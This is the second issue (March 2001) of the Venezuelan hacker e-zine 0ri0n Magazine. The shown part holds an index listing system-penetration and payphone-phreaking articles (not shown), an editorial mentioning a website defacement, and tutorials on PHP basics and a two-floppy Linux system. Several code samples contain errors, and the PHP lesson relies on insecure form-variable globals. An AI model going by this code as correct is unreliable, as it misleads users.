
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

      _____            _____           _______
     / ___ \ _____  _ / ___ \ _ ___   /   _   \____    ___   _ __ ___
    | |  /| |  _  \[_] |  /| | '__ \  |_/| |\_|  __\ /  _  \| '_ ' _ \ 
    | | / | | [_] /| | | / | | |  | |    | |  | [_  |  [_]  | | | | | |
    | |/__| |  _  \| | |/__| | |  | |    | |  | [___|   _   | | | | | |
     \_____/|_| \_\|_|\_____/|_|  |_|    |_|  |_____/\_| |_/|_| |_| |_|
        _         _
       | |       | |___  _ ___ ____  ______ _   _ ____  _     ____
        \ \     / /  __\| '_  |  __\/__   /| | | |  __\| |   /  _  \
         \ \   / /| [_  | | | | [_    /  / | | | | [_  | |  |  [_]  |
          \ \_/ / | [___| | | | [___ /  /__| |_| | [__ | |__|   _   |
           \___/  |____/|_| |_|____/|______|\___/\____/|____|\_| |_/                                           


                 Cuando ser feliz no lo es todo en la vida  ;]

                          Numero 2 - Marzo del 2001

 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

                            -=[  Disclaimer  ]=-

     Toda la informacion que contiene esta revista se publica unicamente
     con fines educativos, el mal uso de la misma no sera en ningun caso
     responsabilidad del editor ni de alguno de los miembros del staff o
     colaboradores. 0ri0n Team Venezuela no  se hace responsable por los
                comentarios/articulos escritos en esta Revista.
                 

        Se han eliminado los caracteres especiales y en el caso de la
                       "ENIE" se ha suplantado por ~ .


          Se Recomienda usar el Edit del DOS o el Editor del Midnight 
	     Commander en Linux para la lectura de esta Revista.


 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

                         -=[   Web's Oficiales   ]=-                        
                                                                         
                             http://www.0ri0n.org
                        http://pleyades.sourceforge.net   
                   
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- 
 
                  -=[  Canal Oficial en el IRC (Dalnet)  ]=-
                         
                                    #otv
                   
                  -=[  Otros Canales en el IRC (Dalnet)  ]=-
 
                                    #Hven
                                 #LinuxAyuda
                                #LinuxLatino



 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

                       -=[  Staff 0ficial E-Zine ]=-

                 Chica4xs          <==>   chica4xs@0ri0n.org
                 El_Max_5          <==>   max-5@0ri0n.org
                 Mr. kl0nk Manson  <==>   kl0nk@0ri0n.org
                 P-Drok-Array      <==>   dr0k@0ri0n.org
                 Pestilencia       <==>   pestilencia@0ri0n.org
                 ShAd0w5           <==>   shadow5@0ri0n.org 



                           -=[  Colaboradores  ]=-


                 aCiD_BuRN_dX      <==>     acid_hack@uol.com.ar
                 Pesado            <==>     pesado@cantv.net
                 Sonyy             <==>     sonico60@hotmail.com                       


 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

                             -=[  Saludos a ...  ]=-


 Por Nick: Combel,   DarkDeath,   Darkgrave,  Kasiki,   EleKtr0,  WolfHack,
           ^J0eL_R^, MerlinX, El_Hechizero, DrAk0 , Kliber,  Nukelite,  s0p
           Linux_Zero, roots, SquOnk, [C]apon[E],  Zomba,  Tito_C,  ^Jess^,
           Inouttime, Vbxsys, Elnomis, Supreme, Ca0s,  Kiwwi Ramirez,  MaU,
           Misis ,  Maquiavelo, _CyRaNo_ , x0rDeath ,  Kacimiro , venomous,
           locomIRC, Vaselin, Melocotoff, Bruj0, MindLock y otros que no me 
	   acuerdo  ahora.
 
 Por Team: http://www.hven.com.ve               (HVEN Seguridad)
           http://www.set-ezine.org             (SET E-Zine)
           http://www.ezkracho.com.ar           (Ezkracho Team)
           http://www.vanhackez.com             (La Tarberna de VanHackez)
           http://svisor.hypermart.net          (Mr. Silence .. B)
           http://www.raza-mexicana.org         (Raza Mexicana Team)
           http://www.cdlr.org                  (Proyecto R)
           http://raregazz.dkch.net/            (RareGaZz Team)
           http://www.meta-verso.com            (InET Team)
           http://www.electron-team.cl          (Electron Security Team)
           http://www.zine-store.com.ar         (Zine Store)
           http://www.kshezine.org              (KSH Team)
           http://dp.set-ezine.org              (Daemons Paradise) 
	   http://www.dtmf.com.ar/digitalrebel/ (DigitalRebel)
           http://www.heineken.com.ar           (Heineken Team)
	   http://www.xakercentral.com          (Xaker Team)
	   http://www.netsearch-ezine.com       (NetSecrah E-Zine)
	   http://www.rdcrew.com.ar             (r0tten dev1ce Crew)
	   http://www.maracaibohot.com          (Uyyy, pa' que mas)
 

 Frases
 Celebres
 del Staff    > Si Mi Amor, ya le compre los pa~ales al Bebe  - kl0nk
              > Vamos a Jugar Quake II por Moviltexto         - Kiwwi
              > Tanto Sexo, Sexo, Sexo y Amor ...             - ShAd0w5
              > Queeee, ya se acabaron las 12 Botellas de Ron - Pestilencia
              > Prestame 1000 Bs y te los pago Ma~ana         - P-Drok-Array
              > Vamos pa' MacDonalds que yo brindo hoy        - Vbxsys
              > Hoy no Navego ... Ma~ana Si                   - El_Max_5

 Otras
 Frases
 Celebres     > I saw a priest kill a cop on the tv           - M.M
              > Cuando yo trabajaba en las Petroleras ...     - Bocamon
              > Quien es esa otra mujer llamada Linux         - La Novia
                                                                de kl0nk
 
  
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 
                           -=[  Indice General ]=-
                  

           [ Contenidos                               ]=[     Autores      ]=
=[ 2x00 ]==[ Portada                                  ]=[                  ]=
=[ 2x01 ]==[ Editorial                                ]=[ El Editor        ]= 
=[ 2x02 ]==[ Programacion Basica en PHP               ]=[ Mr. kl0nk Manson ]=
=[ 2x03 ]==[ Linux en Disketes                        ]=[ P-Drok-Array     ]=
=[ 2x04 ]==[ MicroProcesadores (I)                    ]=[ Chica4xs         ]=
=[ 2x05 ]==[ Manejando SQL (I)                        ]=[ ShAd0w5          ]=
=[ 2x06 ]==[ Montando un Eggdrop para Newbie's        ]=[ Pestilencia      ]=
=[ 2x07 ]==[ Montando una Intranet con Linux          ]=[ Mr. kl0nk Manson ]=
=[ 2x08 ]==[ Como programar en C en muchos pasos (II) ]=[ El_Max_5         ]=
=[ 2x09 ]==[ Metodos de PENEtracion de sistemas       ]=[ Sonyy            ]=
=[ 2x10 ]==[ Articulos Varios                         ]=[ Varios           ]=
=[ 2x0a ]==[ Programacion de Celulares                ]=[ Pesado           ]=
=[ 2x0b ]==[ Phreak Inofencivo                        ]=[ aCiD_BuRN_dX     ]=
=[ 2x0c ]==[ Kernel 2.4.x                             ]=[ Mr. kl0nk Manson ]=
=[ 2x11 ]==[ Casos de la Vida Real                    ]=[ 0ri0n Staff      ]=
=[ 2x12 ]==[ Glosario de Terminos de Computacion      ]=[ 0ri0n Staff      ]=
=[ 2x13 ]==[ Proyectos Varios                         ]=[ 0ri0n Staff      ]=
=[ 2x14 ]==[ Seccion Anti-Stress                      ]=[ 0ri0n Staff      ]=
=[ 2x15 ]==[ Llaves PGP                               ]=[ 0ri0n Staff      ]=
=[ 2x16 ]==[ Fuente de Extract                        ]=[ 0ri0n Staff      ]=
=[ 2x17 ]==[ Esto es todo Amigos ...                  ]=[ El Editor        ]=


--EOF--


-[ 2x01 ]--------------------------------------------------------------------
-[ Editorial ]------------------------------------------[ Mr. kl0nk Manson ]-
--------------------------------------------------------[  kl0nk@0ri0n.org ]-

 Hola Gente.

 Nos  volvemos  a  ver  en esta segunda edicion de 0ri0n Magazine, no  hace
 nada estabamos  programando  sacar una revista y ahora ya tenemos  dos ;), 
 con respecto a este numero pues nos atrazamos un mes :( pero  esto fue por
 los retoques a los articulos, ya que ahora trabajaremos con el extract  de
 phrack (pero con las modificaciones que le hicieron la gente de netsearch).
 
 Con respecto al movimiento  del  Underground  aqui  en Venezuela pues  les 
 cuento  que  estan apagados, ya casi no se oye nombrar, lo ultimo que supe 
 fue que crakearon la web  de  Digitel (digitel.com.ve) en modo de protesta 
 por las altas tarifas telefonicas y fue un Venezolano el que lo hizo, pero 
 bueno, por lo menos 0ri0n trata de hacer para evitar esto.
 
 Para este numero tenemos  la  segunda  entrega  de el curso de programacion
 en C, un peque~o texto que habla sobre Linux en disketes, el montaje de una
 intranet con Linux, Programacion Basica en PHP, un buen articulo sobre  SQL
 (que se  entregara en varias partes), Tambien tenemos  un texto  sobre  los
 microprocesadores, tambien contamos con un articulo sobre telefonia celular
 (Thx Pesado and Pestilencia) ... y ... tambien ya nos han llegado articulos
 para el Zine, como es el de aCiD_BuRN_dX, habla un poco sobre como burlar a
 las cabinas  telefonicas en Argentina y el de Sonyy que  son los metodos de
 PENEtracion de sistemas. Tambien  tenemos  una  nueva  seccion que es la de
 Anti-Stress (Thx ShAd0w5), esta  es  para despues  de leer la revista  pues 
 despejes un poco la cabeza =)
 
 << ShAd0w5: Acuerdate de las Hermosas Criticas/Comentarios/etc .... jejeje..
             pero a la final es publicidad no pagada =) 
 >>

 Umm, tambien  nos  han  llegado "Muchas Criticas", tambien  nos han llegado
 comentarios sobre esta revista y que necesita la gente de hoy, como tambien
 nos han llegado muchas "Felicitaciones", la verdad que es  un  poco dificil
 porque somos el segundo grupo Venezolano que edita  una  revista y cada dia
 debemos mejorar la calidad de los articulos ... pero bueno, alli vamos poco
 a poco.

 Tambien  los  invito a que  lean  el articulo (2x13.txt) porque  de  verdad 
 necesitamos mucha colaboracion para que 0ri0n siga surgiendo.

 Han pasado muchas cosas en nuestro grupo, de las cuales se esta hablando de
 una depuracion del staff (mucho bulto no sirve ... somos muchos, trabajamos
 pocos); tambien queria  agradecer  a  Pestilencia  por  habernos re-fundado
 nuestro canal en el irc, que es el de #otv en irc.dal.net:7000.

 Bueno, ahora relajesen un  poco y esperamos  que  les  guste  esta  segunda
 edicion.





-[ 2x02 ]--------------------------------------------------------------------
-[ Programacion Basica en PHP ]-------------------------[ Mr. kl0nk Manson ]-
--------------------------------------------------------[  kl0nk@0ri0n.org ]-


  Indice General:
  ---------------

  1.- Introduccion.
  2.- Comentarios.
  3.- Variables.
      3.1.- Declaracion.
  4.- Tipos de Variables.
  5.- Cadenas de Caracteres.
  6.- Arrays (Arreglos).
  7.- Conversiones.
  8.- Variables Predefinidas (HTTP).
  9.- Constantes.
 10.- Operaciones.
 11.- Estructuras de control.
      11.1.- Condicionales.
      11.2.- Switch.
      11.3.- For (Haga Desde).
      11.4.- While (Haga Mientras).
 12.- Funciones.
      12.1.- Declaracion.
      12.2.- Variables locales en funciones.
      12.3.- Variables estaticas.
      12.4.- Acceso a variables globales.
      12.5.- Devolucion de un valor.
 13.- Librerias.
 14.- Conclusion.



 Introduccion:
 -------------

 Hi People's, nos volvemos a ver y como lo prometido es deuda pues aqui esta
 la segunda entrega de el mini-cursillo de PHP, donde en la primera  entrega
 explique la gran funcionalidad que tiene el PHP frente  a  otros  lenguajes
 orientados a programacion Web. Adjunto  a esta Revista  viene  incluido  un
 un   script   en  Perl   para   instalar  el   PHP,  MySQL  y    el  Apache 
 (iwebserver-1.1.tar.gz). Bueno,  despues    de  esta   corta   introduccion
 empecemos....


 Podemos escribir codigos en PHP en paginas .html de la siguiente forma:

 a.- Inluyendo el codigo entre <? y ?>
 b.- Inluyendo el codigo entre <?PHP y ?> 
 c.- Inluyendo el codigo entre <SCRIPT LANGUAGE="php"> y </SCRIPT> 

 Por Ejemplo:

 <HTML>
 <BODY>
 <?PHP echo ("Hi People's") ;?>
 </BODY>
 </HTML>

 Podemos guardar ese codigo como ej.php (o .php3 o .phtml, esto  depende como
 tengas configurado el Apache o el Web Server que tu utilices). Luego de esto
 podemos  cargar  en nuestro navegador esa web  y  debe aparecer el siguiente
 mensaje:

 Hi People's

 
 1.2 Comentarios
 ---------------

 Los comentarios en PHP se escriben de la siguiente forma:

 a.- Con // o # para comentarios de una salto de linea.
 b.- Con /* y */ para comentarios de una o mas lineas.

 Por Ejemplo:

 <HTML>
 <BODY>

 <?PHP
 /*
   Hola, esto es un comentario, que cuando esto sea
   procesado por el PHP no muestre este mensaje en 
   nuestro navegador.
 */

 // Comentario de una Linea
 echo("Hi People's");
 ?>

 Al  procesar estas lineas el PHP producira la misma salida  que  el  ejemplo
 anterior.


 1.3 Variables
 -------------

 Las Variables en PHP se declaran con el simbolo $ (Dolar).

 1.3.1 Declaracion
 -----------------

 Simplemente la declaramos de la siguiente forma:

 $variable = "Aleluya";

 y Podemos iprimirla de la siguiente forma:

 <?PHP echo ($variable); ?>

 y deberia aparecerte en tu Browser:

 Aleluya


 1.3.2 Tipos de Variables
 ------------------------

 Los tipos de variables basicas en PHP son:

 a.- Integer
 b.- Double
 c.- String
 d.- Array
 e.- Object

 En el caso de de las variables booleanas se trabajan de forma "1" como TRUE
 (Verdadero) y "0" como FALSE (Falso).

 En el caso de PHP las variables  no  tienen  un  valor fijo, simplemente se
 utilizan funciones para transformar los valores.


 1.3.3 Cadenas de Caracteres
 ---------------------------

 Las cadenas de caracteres en  PHP se especifican con comillas simples o por
 comillas dobles:

 <?PHP

 $Cadena1 = "Hola People's";
 echo($Cadena1);
 $Cadena2 = 'Hola Mane's';
 echo($Cadena2);

 ?>

 Para unir (concatenar) una o mas variables simplemente "."

 $Cadena = "Hi";
 $CadenaT = $Cadena . "People'sss";
          
 echo($CadenaT);


 Tambien podemos usar dentro de las comillas el caracter \ y tambien el \n,
 \t.

 1.3.4 Arrays (Arreglos)
 -----------------------

 En PHP, los arrays (arreglos) son muy poderosos y faciles  de  trabajar, ya
 que trabajan de la siguiente forma:

 <?PHP

 $arreglo[x]= "Valor"

 ?>

 Donde "x", va a ser la posicion del arreglo; si no definimos la posicion el
 PHP automaticamente asignara una posicion, si es la primera tomaria el valor
 de "0".

 Ejemplo:

 <?PHP

 $arreglo[] = "Hola, esto es ";
 $arreglo[] = "una Prueba del poder de PHP";

 echo ("$arreglo[0] $arreglo[1]");

 ?>

 Y Deberias ver en tu Browser:

 Hola, esto es una Prueba del poder de PHP


 Otra forma es de direccionar elementos en un array asociandolos. En el caso
 de los arrays asociativos, en vez de accederse por un indice, se accede por
 clave (las claves si son case sensitive), por ejemplo:

 <?PHP

 $arreglo["Nombres"]   = "Pedrito Sinforozo";
 $arreglo["Apellidos"] = "Alima~a Perez";

 echo ("$arreglo[\"Nombres\"]\n$arreglo[Nombres]\n
        $arreglo[\"Apellidos\"]\n$arreglo[apellidos]")

 ?>

 Y deberia aparecer en tu browser:

 Nombres
 Pedrito Sinforozo
 Apellidos
 Alima~a Perez


 En el caso de los arrays multidimencionales simplemente se a~ade corchetes y
 el subindice deseado.


 1.3.5 Conversiones
 ------------------

 Para convertir una  variable de un tipo a otro se emplea el casting mediante
 parentesis:

 $Variable = "1969";
 $valor = (integer) $Variable;

 Ahora, la  variable  $valor  contiene  el  valor  numerico  de  la  variable
 $Variable.

 Tambien  podemos  emplear  la  funcion  SetType($varriable, "vartype")  para
 forzar que la variable $variable sea del tipo vartype.

 De todas formas, PHP  es  bastante consecuente  en  cuanto  a los  tipos, de
 manera que si sumamos un numero a una cadena, esa cadena se convierte  en un
 numero:


 1.3.6 Variables Predefinidas (HTTP)
 -----------------------------------

 PHP tiene toda una serie de variables predefinidas que tienen que ver con
 el lenguaje HTML, y entre ellas odemos encontar:

 $PHP_AUTH_USER  : Autenticacion de Usuarios. 
 $PHP_AUTH_TYPE  : Tipo de autorizacion. 
 $PHP_AUTH_PW    : Contrase~a con la que se autentica el usuario. 
 $HTTP_POST_VARS : Array con las variables de un form pasadas por el metodo
                   POST.
 $HTTP_PUT_VARS  : Array con las variables de un form pasadas por el metodo
                   PUT.

 Aparte de los arrays $HTTP_PUT_VARS y $HTTP_POST_VARS, podemos acceder a las
 variables provenientes de forms HTML como $variable, supongamos el
 siguiente form:

[++] CursoPHP/formulario.html
<HTML>
<BODY>
<FORM ACTION="formulario.php">
 <INPUT TYPE="TEXT" NAME="Nombre">
 <INPUT TYPE="TEXT" NAME="Apellido[0]">
 <INPUT TYPE="TEXT" NAME="Apellido[1]">
 <INPUT TYPE="SUBMIT" NAME="Aceptar" VALUE="Aceptar">
</FORM>
</BODY>
</HTML>
[--]

 Mientras que en la pagina formulario.php podemos acceder a las variables del
 form con:

[++] CursoPHP/formulario.php
<?PHP
 Echo("Nombre: $Nombre <BR>
 Apellido1: $Apellido[0] <BR>
 Apellido2: $Apellido[1] <BR>");
?>
[--]

 1.4 Constantes
 --------------

 Las constantes en PHP no comienzan por "$" porque se inicializan con la
 construccion define(nombre_de_la_const):

 <?PHP

 define("klOnk", 0001);
 Echo(klOnk);

 ?>

 Las constantes predefinidas __FILE__ y __LINE__ nos dan el nombre del
 fichero y el numero de linea actual.


 1.5 Operaciones
 ---------------
 En PHP se puede hacer operaciones del tipo booleanas (0 o 1), concatenacion
 de cadenas, aritmeticas.

 1.6 Estructuras de control
 --------------------------

 Las estructuras de control de PHP son iguales que las de C, y encontamos las
 siguientes:

 Condicionales
 -------------

 La estructura de los condicionales es igual que en C:

 if ($password == "notelodigo")
 {
    echo ("Acceso Aceptado ... Presione cualquier tecla para Continuar");

 } else

 {
    echo ("Acceso Denegado ... GetOut Here");
 }

   
 Switch
 ------

 switch ($password) {
   case "notelodigo":
   break;
   case "123456":
   break;
   default:
 }


 For (Haga Desde)
 ----------------

 for ($i=0;i<40;i++)
 {
    Echo("\$i.- Bombaaa\n");
 }


 While (Haga Mientras)
 ---------------------
 $Salir = 0;

 while (!$Salir) {
  Echo("Ufff\n");
  $Salir = 1;
 }

 do {
   Echo("Ufff\n");
   $Salir = 1;
 } while (!$Salir);


1.7 Funciones
-------------

 Declaracion
 -----------

 La Estructura Basica de una Funcion es la Siguiente:

 function salida($Variable)
 {
   Echo("<FONT color=000000>$Variable</font>");
 }

 
 Variables locales en funciones
 ------------------------------
 Para definir una variable local, simplemente se asigna un valor a la
 variable:

 function Vam($valor) {
   $valor = 0.53 * $valor;
   Echo("$valor :\n");
 }

 Variables estaticas
 -------------------
 Si queremos que la variable local conserve el valor de invocacion a 
 invocacion de la funcion, basta declararla como estatica: 

 function Contador()
 {
  static $contador = 0;
  $contador2 = 0;
  $contador2++;
  $contador++;
  echo ("Contador1: $contador y Contador2: $contador2");
 }

 for (i=0; i<=2; ++i) {
   Contador();
 }

 Deberia aparecerte:

 Contador1: 1 y Contador2: 1
 Contador1: 2 y Contador2: 1
 Contador1: 3 y Contador2: 1


 Acceso a variables globales
 ---------------------------

 Esto  es  en  los que se diferencia el PHP de C y es un punto  importante y
 Es el dolor de cabeza de los principiantes en PHP.

 Simplemente para acceder a una variable global desde  dentro de una funcion
 es necesario declararla dentro de la funcion como global  $variable, ya que
 de otro modo PHP pensara que se desea hacer referencia a una variable local

 Por Ejemplo:

 function VarGlobal() {
    global $Cadena;
    $Cadena = "Que Viva la Pepa!";
    $Valor = 12;

    Echo("Dentro de VarGlobal ahora la Variable \$Cadena vale " . 
      $Cadena " . "y \$Valor vale $Valor\n");
 }

 $Cadena = "I Hate Fucking World";
 $Valor = 12;
 Echo("\$Cadena vale $Cadena y \$Valor vale $Valor\n");
 VarGlobal();
 Echo("\$Cadena ahora vale $Cadena y \$Valor sigue "."valiendo
        $nValor<BR>");


 Devolucion de un valor
 ----------------------

 Para devolver un valor se emplea "return" .

 function Manga($Valor) {
   if ($Valor <= 5) {
      return 1;
   } else {
      return Manga($Valor+2)*$Valor;
   }
 }

 Echo("El Total es :" Manga($Valor));

 Tambien  dentro  de PHP  podemos  incluir  funciones  dentro  de  funciones
 (recursividad).


 Librerias
 ---------

 La  Funcion "Include" incluye  un fichero dentro de un codigo  en  cualquier
 pagina hecho en PHP, podemos definir en un archivo las configuracion y luego
 hacer los llamados a ese archivo, como por ejemplo:

 Archivo proceso.php:

 <?PHP
 include("config.php");
 echo("Mi Login es: $login y mi Passowrd es: $passwd");
 ?>
 
 Archivo config.php:

 <?PHP

 $login="kl0nk";
 $passwd="********";

 ?>


 Esto es todo amigos.
 
 --Mr. kl0nk Manson
 


-[ 2x03 ]--------------------------------------------------------------------
-[ Linux en Disketes ]----------------------------------[  P-Drok-Array    ]-
--------------------------------------------------------[  dr0k@0ri0n.org  ]-


 Introduccion:
 -------------

 El Objetivo de ese texto es dar a conocer como hacer una Mini-Distribucion
 de linux en disketes o simplemente unos discos  de arranque  pero  con  un
 minimo de aplicaciones.

 Ustedes diran, para que nos sirve esto?, pues muy simple, imaginate que se
 te da~o tu Linux y que no puedes recuperarlo porque no puedes acceder a el
 pero entonces ya tienes unos super-discos de rescates (la cual trae editor
 de texto, compilador, etc) y con esto puedes salvar tu informacion; otra es
 crear o desarrollar una peque~a distribucion de Linux, que en vez de tenerla
 instalada la podrias arrancar desde varios disketes disquete.


 La Idea!
 --------

 Lo que vamos a  hacer es simplemente agarrar un diskete y meter un kernel ya
 compilado, luego  crear  un filesystem, llenarlo  de  las  aplicaciones  que
 queramos y mandarlo a un segundo diskette. El primer diskete nos va a servir
 de guia y en vez de apuntar a un filesystem de un disco duro nos tendria que
 apuntar al de el diskette.


 Que necesitamos?
 ----------------

 1. Dos Disketes, uno para el BOOT y el otro para el FileSystem.
 2. Una Computadora con Linux.
 3. Que el Kernel tenga Soporte para RamDisk y LoopBack.
 4. Por lo minimo, 4 Jarras de Cafe y una de Agua y una Cajetilla de
    Cigarros (Opcional).
 5. Mucha paciencia.
    

 Pasos para la Construccion:
 ---------------------------

 1.- Lo primero que debemos hacer  es hacernos un kernel de linux, que nos 
     servira para arrancar el sistema. Debemos tener activado la opcion de
     ram disk support, y la opcion  de  loopback  device  support, tambien
     debemos incluir los modulos que vamos a utilizar (como una unidad ZIP,
     CD-ROM, Tarjetas de Red, DVD, Sonido, etc).

 2.- Debemos hacer un File System, esta parte es la que  nos consumira mas
     tiempo, El tama~o del file  system  dependera  de  la computadora que
     vayamos a usar, el cual sera de 4096 KB.

     Para crearlo simplemente hacemos:

     #dd if=/dev/zero of=/tmp/fs bs=1k count=4096  // Con esto creamos  un
                                                   // archivo   de   4  MB
                                                   // llamado   filesystem
                                                   // en el direcorio /tmp

     #mke2fs -m 0  /tmp/fs                         // Creamos un sistema de
                                                   // archivos ext2
       
     #mount -t ext2 -o loop  /tmp/fs /mnt/fs       // Montamos el filesystem
                                                   // que acabamos de crear 

                                                                             
 3.- Ahora  simplemente  debemos  incluir en el Filesystem  los  archivos  a
     utilizar, aqui les dejo una lista de los archivos que pueden incluir:

  bin:
      ksh  
      more  
      dmesg  
      ps  
      login  
      sync  
      mount  
      umount  
      kill  
      setterm  
      hostname  
      telnet  
      ping  
      ftp  
      tar  
      killall  
      chmod  
      chown  
      cp  
      dd  
      df  
      du  
      ls  
      mkdir  
      mv  
      rm  
      ln  
      dircolors  
      cut  
      cat  
      stty  
      gzip  
      domainname
      date@ -> ../sbin/clock  
      less@ -> more   
      sh
      gunzip@ -> gzip  
      zcat@ -> gzip  
      bash

  etc:   
      psdevtab   
      inittab   
      passwd   
      motd   
      fstab   
      hosts   
      termcap   
      services   
      rpc   
      protocols   
      networks   
      mtools   
      hosts.orig   
      hosts.deny   
      hosts.allow   
      exports   
      DIR_COLORS   
      HOSTNAME   
      resolv.conf
      inetd.conf   
      ld.so.cache   
      shells   
      host.conf   
      magic   
      utmp   
      group   
      ld.so.conf
      mtab   
      kernel   
      issue   
      profile   
      fastboot   

      etc/rc.d:

        rc.inet
        rc.local   
        rc.6   
        rc.M   
        rc.0   
        rc.K   
        rc.S   


  sbin:  
      swapoff@ -> swapon  
      telinit@ -> init  
      reboot@ -> halt  
      addswap                 => Ver Nota Abajo
      chkhd  
      clock  
      selection  
      swapon  
      update  
      mkswap  
      agetty  
      init  
      shutdown  
      halt  
      killall5  
      ifconfig  
      route  

  usr:  
      adm@ -> ../var/adm  
      usr/bin:  
      mdeltree@ -> mtools  
      mrd@ -> mtools  
      mren@ -> mtools  
      mcd@ -> mtools   
      mmd@ -> mtools  
      mcopy@ -> mtools  
      mdel@ -> mtools  
      mdir@ -> mtools  
      mformat@ -> mtools  
      who  
      superformat  
      loadkeys  
      joe  
      mtools  
      uptime  
      finger  
      mcheck  
      tput  
      traceroute  
      host  
      split  
      sleep  
      setfont  
      grep  
      reset  
      usr/sbin:  
      ip 
      spool@ -> ../var/adm  
      usr/local:  
      usr/local/bin:  
      usr/local/lib:  
      lynx.cfg  
      usr/local/sbin:  
      bootpc  

      usr/lib:

        es.map
        t.fnt  

      usr/lib/joe:

        joerc

      usr/lib/terminfo:
      usr/lib/terminfo/l:  

        linux

      usr/lib/terminfo/c:

        console

 lib:
      libgpm.so@ -> libgpm.so.1  
      libdl.so@ -> libdl.so.1  
      ld-linux.so.1  
      libtermcap.so.2  
      libm.so.5  
      libc.so.5  
      libdl.so.1  
      libgpm.so.1  
      libtermcap.so.2  
      libcurses.so.1  
      ld.so

  dev:
     /dev/cua0
     /dev/cua1
     /dev/cua2
     /dev/cua3
     /dev/hda1
     /dev/hda2
     /dev/hda3
     /dev/hda4
     /dev/hda
     /dev/hdb
     /dev/hdb1
     /dev/hdb2
     /dev/hdb3
     /dev/hdb4
     /dev/hdc
     /dev/hdc1
     /dev/hdc2
     /dev/hdc3
     /dev/hdc4
     /dev/ram
     /dev/ram0
     /dev/ram1
     /dev/ram2
     /dev/ram3
     /dev/ram4
     /dev/ram5
     /dev/ram6
     /dev/null
     /dev/console
     /dev/zero
     /dev/kmem
     /dev/mem
     /dev/tty0
     /dev/tty1
     /dev/tty2
     /dev/tty3
     /dev/tty4
     /dev/tty5
     /dev/tty6
     /dev/tty7
     /dev/ttyp0
     /dev/ttyp1
     /dev/ttyp2
     /dev/ttyp3
     /dev/ttyp4
     /dev/ttyp5
     /dev/ttyp6
     /dev/ttyp7

  var:
      var/adm:  
      utmp  
      cron  
      var/spool:  
      var/spool/uucp:  
      var/spool/locks:  
      var/tmp:  
      var/run:  
      utmp  

 home:  
      home/DrOk

 Directorios Vacios:
      lost+found  
      root 
  
  
  addswap: Simplemente creamos este archivo en /mnt/fs/sbin y le incluimos
           el siguiente script:
 
  #!/bin/bash
  MEM=2048
  ARCH=/dev/ram1
  dd if=/dev/zero of=$ARCH bs=1k count=$MEM
  mkswap -c $DISP 2>/dev/null
  sync 2>/dev/null 
  swapon $DISP 2>/dev/null 

  Tambien se puede determina en donde estan las librerias para los programa
  con:

  #ldconfig -r fs

  Con esto conseguimos hacer  una  memoria virtual  de  tipo swap (de 2MB),
  podemos   hacer   el  llamado  de   este   fichero   desde   el   archivo
  /mnt/fs/etc/rc.d/rc.S para que cada  vez  que utilicemos  estos  disketes
  el automaticamente cree la swap.

  Editamos el archivo /mnt/fs/etc/inittab y colocamos las siguientes lineas:

  id:3:initdefault:
  si::sysinit:/etc/rc.d/rc.S 
  rc::bootwait:/etc/rc.d/rc.M
  ca::ctraltdel:/sbin/shutdown -t3 -rf now
  l0::wait:/etc/rc.d/rc.0
  l6::wait:/etc/rc.d/rc.6
  1::123:respawn:/sbin/agetty 38400 tty1 linux
  2::123:respwan:/sbin/agetty 38400 tty2 linux
  3::123:respwan:/sbin/agetty 38400 tty3 linux

  Con respecto al archivo fstab podemos colocar lo siguiente:


  /dev/ram0       /               ext2    defaults   1   1
  /dev/ram2       swap            swap    defaults   0   0               
  none            /proc           proc    defaults   0   0

  Si necesitamos mas megas en la ram solo ejecutamos el siguiente
  script

  #!/bin/bash
  MEM=2048       # Puedes cambiarlo por los megas que necesites
  ARCH=/dev/ram3 # Podemos habilitar el ram3 hasta el ram6 
  dd if=/dev/zero of=$ARCH bs=1k count=$MEM
  mkswap -c $DISP 2>/dev/null
  sync 2>/dev/null 
  swapon $DISP 2>/dev/null 

  NOTA: La cantidad de memoria que deseas habilitar dependera a la ram que
        tengas instalado en tu maquina.
      

 4. Ahora simplemente nos queda desmontar el filesystem y mandarlo al diskete
    y para ello hacemos el siguiente comando:

    #umount /mnt/fs; cd /tmp; gzip -9 fs; dd if=fs.gz of=/dev/fd0 bs=1k
     count=4096

    NOTA: Este es el Segundo Diskete.

    Ahora  meteremos  en  el primer  diskete  una  imagen  ya  compilada (por
    ejemplo) con:

    #cd /boot; dd if=vmlinuz of=/dev/fd0 

    Listo, ahora nos queda decirle al kernel a que filesystem nos va a apuntar
    con:
        
    #rdev /dev/fd0 /dev/fd0  // Para indicarle al Kernel que el ramdisk lo
                             // debe buscar en la fd0.
  
    Y Listo, esto  es  todo,  solo  nos  queda reiniciar y insertar el primer
    disco, y luego el nos  pedira  el segundo y  ya tendremos una mini-distri
    de linux en dos disketes.

    Aqui les dejo una  Lista  de  Mini-Disribuciones de  Linux, para  que las
    Prueben, las hackeen y demas cosas:

    Brutalware   > http://underground.cz/brutalware/
    cLIeNUX      > http://metalab.unc.edu/pub/Linux/distributions/cLIeNUX/
    dLITE        > http://opensrc.org/dlite/
    DLX          > http://www.wu-wien.ac.at/usr/h93/h9301726/dlx.html
    DosLinux     > http://www.tux.org/pub/people/kent-robotti/
    DragonLinux  > http://www.dragonlinux.nu/
    Floppyfw     > http://www.zelow.no/floppyfw/ 
    Floppix      > http://www.algonquinc.on.ca/infosystems/macewal/floppix.html
    Fluf         > http://www.upce.cz/~kolo/fluf.htm
    hal91        > http://home.sol.no/~okolaas/hal91.html
    HVLinux      > http://hvlinux.sourceforge.net
    LOAF         > http://www.ecks.org/loaf/
    Linux Router > http://www.linuxrouter.org/
    LSD          > http://wwwcache.ja.net/dev/lsd/
